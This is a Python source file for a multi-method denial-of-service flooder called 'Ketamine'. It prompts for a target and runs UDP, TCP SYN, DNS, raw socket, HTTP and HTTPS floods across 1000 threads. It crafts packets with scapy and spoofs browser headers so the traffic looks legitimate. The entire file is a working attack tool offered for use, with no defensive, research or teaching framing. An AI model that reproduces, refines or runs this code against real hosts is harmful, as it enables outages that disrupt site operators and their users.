import os
import signal
import traceback
import threading
import socket
import time
import random
from typing import Dict, Callable, Optional

from scapy.all import IP, UDP, TCP, Raw, DNS, DNSQR, send
import httpx
from rgbprint import gradient_print

COLOR_MENU = ((0, 64, 64), (45, 0, 75))
COLOR_SUCCESS = ((0, 128, 0), (0, 32, 0))
COLOR_FAILED = ((128, 0, 0), (102, 0, 0))
COLOR_WARNING = ((255, 165, 0), (255, 140, 0))
COLOR_INFO = ((0, 128, 0), (0, 32, 0))
COLOR_ERROR = ((128, 0, 0), (69, 0, 0))
COLOR_METHOD = ((15, 15, 50), (45, 0, 75))

UDP_PACKET_SIZE = 65507
TCP_PACKET_SIZE = 65535
TLS_PACKET_SIZE = 65535
DNS_PACKET_SIZE = 512
SOCKET_PACKET_SIZE = 1472
HTTP_PACKET_SIZE = 65536
HTTPS_PACKET_SIZE = 65536

USER_AGENT_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
]

ACCEPT_ENCODING_LIST = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
]

ACCEPT_LIST = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.7',
    'application/json, text/plain, */*;q=0.01',
]

REFERER_LIST = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/'
]

THREAD_COUNT = 1000


class Ketamine:
    def __init__(self) -> None:
        self.ip: Optional[str] = None
        self.hostname: Optional[str] = None
        self.port: int = 0
        self.duration: int = 0

    def clear_terminal(self) -> None:
        os.system('cls || clear')

    def resolve_hostname(self, hostname: str) -> Optional[str]:
        hostname = hostname.replace('http://', '').replace('https://', '').split('/')[0]
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            gradient_print("[ERROR] Could not resolve hostname", start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
        except Exception as e:
            gradient_print(f"[ERROR] Unexpected error: {e}", start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
        return None

    def _generate_payloads(self) -> Dict[str, bytes]:
        try:
            return {
                'udp': random._urandom(UDP_PACKET_SIZE),
                'tcp': random._urandom(TCP_PACKET_SIZE),
                'tls': random._urandom(TLS_PACKET_SIZE),
                'dns': random._urandom(DNS_PACKET_SIZE),
                'socket': random._urandom(SOCKET_PACKET_SIZE),
                'http': random._urandom(HTTP_PACKET_SIZE),
                'https': random._urandom(HTTPS_PACKET_SIZE)
            }
        except Exception as e:
            raise ValueError(f'[ERROR] Payload generation failed: {e}')

    def _generate_headers(self) -> Dict[str, str]:
        return {
            'User-Agent': random.choice(USER_AGENT_LIST),
            'Accept': random.choice(ACCEPT_LIST),
            'Accept-Encoding': random.choice(ACCEPT_ENCODING_LIST),
            'Connection': 'keep-alive',
            'Referer': random.choice(REFERER_LIST),
        }

    def perform_udp_flood(self, ip: str, port: int, duration: int, payload: bytes) -> None:
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                packet = IP(dst=ip) / UDP(dport=port) / Raw(payload)
                send(packet, verbose=0)
                gradient_print(f'[INFO] UDP packet sent to {ip}:{port}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] UDP attack failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
            traceback.print_exc()

    def perform_tcp_flood(self, ip: str, port: int, duration: int, payload: bytes) -> None:
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                packet = IP(dst=ip) / TCP(dport=port, flags="S") / Raw(payload)
                send(packet, verbose=0)
                gradient_print(f'[INFO] TCP packet sent to {ip}:{port}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] TCP attack failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
            traceback.print_exc()

    def perform_tls_flood(self, ip: str, port: int, duration: int, payload: bytes) -> None:
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                packet = IP(dst=ip) / TCP(dport=port, flags="S") / Raw(payload)
                send(packet, verbose=0)
                gradient_print(f'[INFO] TLS packet sent to {ip}:{port}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] TLS attack failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
            traceback.print_exc()

    def perform_dns_flood(self, ip: str, duration: int, payload: bytes) -> None:
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                packet = IP(dst=ip) / UDP(dport=53) / DNS(qr=0, rd=1, qd=DNSQR(qname=payload))
                send(packet, verbose=0)
                gradient_print(f'[INFO] DNS flood packet sent to {ip}:53', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] DNS flood attack failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
            traceback.print_exc()

    def perform_http_flood(self, url: str) -> None:
        try:
            with httpx.Client() as client:
                end_time = time.time() + self.duration
                while time.time() < end_time:
                    headers = self._generate_headers()
                    response = client.get(url, headers=headers)
                    gradient_print(f'[INFO] HTTP request sent to {url} - status: {response.status_code}, content: {response.text[:100]}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] HTTP request failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])

    def perform_https_flood(self, url: str) -> None:
        try:
            with httpx.Client(verify=False) as client:
                end_time = time.time() + self.duration
                while time.time() < end_time:
                    headers = self._generate_headers()
                    response = client.get(url, headers=headers)
                    gradient_print(f'[INFO] HTTPS request sent to {url} - status: {response.status_code}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] HTTPS request failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])

    def perform_socket_flood(self, ip: str, port: int, duration: int, payload: bytes) -> None:
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
                s.close()
                gradient_print(f'[INFO] Socket packet sent to {ip}:{port}', start_color=COLOR_METHOD[0], end_color=COLOR_METHOD[1])
        except Exception as e:
            gradient_print(f'[ERROR] Socket flood attack failed: {e}', start_color=COLOR_ERROR[0], end_color=COLOR_ERROR[1])
            traceback.print_exc()

    def run_threads(self, method: Callable[[], None], max: int) -> None:
        threads = []
        for _ in range(max):
            thread = threading.Thread(target=method)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def run_attack(self, method: str, ip: str, port: int, duration: int, hostname: str, payloads: Dict[str, bytes]) -> None:
        try:
            url = f'https://{hostname}:{port}'
            match method:
                case 'udp':
                    self.run_threads(lambda: self.perform_udp_flood(ip, port, duration, payloads['udp']), THREAD_COUNT)
                case 'tcp':
                    self.run_threads(lambda: self.perform_tcp_flood(ip, port, duration, payloads['tcp']), THREAD_COUNT)
                case 'tls':
                    self.run_threads(lambda: self.perform_tls_flood(ip, port, duration, payloads['tls']), THREAD_COUNT)
                case 'dns':
                    self.run_threads(lambda: self.perform_dns_flood(ip, duration, payloads['dns']), THREAD_COUNT)
                case 'socket':
                    self.run_threads(lambda: self.perform_socket_flood(ip, port, duration, payloads['socket']), THREAD_COUNT)
                case 'http':
                    self.run_threads(lambda: self.perform_http_flood(url), THREAD_COUNT)
                case 'https':
                    self.run_threads(lambda: self.perform_https_flood(url), THREAD_COUNT)
                case _:
                    gradient_print(f'[WARNING] Unsupported method: {method}', start_color=COLOR_WARNING[0], end_color=COLOR_WARNING[1])
                    return
        except Exception as e:
            gradient_print(f'[WARNING] Setup failed: {e}', start_color=COLOR_WARNING[0], end_color=COLOR_WARNING[1])

    def check_exit(self, sig: int, frame) -> None:
        self.clear_terminal()
        gradient_print('[INFO] Exiting program...', start_color=COLOR_INFO[0], end_color=COLOR_INFO[1])
        exit(0)

    def main(self) -> None:
        signal.signal(signal.SIGINT, self.check_exit)

        while True:
            try:
                gradient_print(r"""
                            ,--.
                           {    }
                           K,   }
                          /  ~Y`
                     ,   /   /
                    {_'-K.__/
                      `/-.__L._
                      /  ' /`\_}
                     /  ' /
             ____   /  ' /
      ,-'~~~~    ~~/  ' /_
    ,'             ``~~~  ',
   (                        Y
  {                         I
 {      -                    `,
 |       ',                   )
 |        |   ,..__      __. Y
 |    .,_./  Y ' / ^Y   J   )|
 \           |' /   |   |   ||
  \          L_/    . _ (_,.'(
   \,   ,      ^^""' / |      )
     \_  \          /,L]     /
       '-_~-,       ` `   ./`
          `'{_            )
              ^^\..___,.--`     
""", start_color=COLOR_MENU[0], end_color=COLOR_MENU[0])
                gradient_print('--------developed by @Gelshll--------\n[group: @Ketapps] [exit: Ctrl+C]\n---------------------------------', start_color=COLOR_MENU[0], end_color=COLOR_MENU[1])
                target = input('Enter target (hostname or IP): ').strip()
                self.port = int(input('Enter port (1-65535): ').strip())
                self.duration = int(input('Enter duration (seconds): ').strip())
                method = str(input('Enter method (udp, tcp, tls, dns, socket, http, https): ').strip())
                payloads = self._generate_payloads()
                self.ip = self.resolve_hostname(target)
                if self.ip:
                    self.run_attack(method, self.ip, self.port, self.duration, target, payloads)
            except Exception as e:
                gradient_print(f'[WARNING] Error occurred: {e}', start_color=COLOR_WARNING[0], end_color=COLOR_WARNING[1])
                traceback.print_exc()
                time.sleep(5)
                self.clear_terminal()

if __name__ == '__main__':
    Ketamine().main()
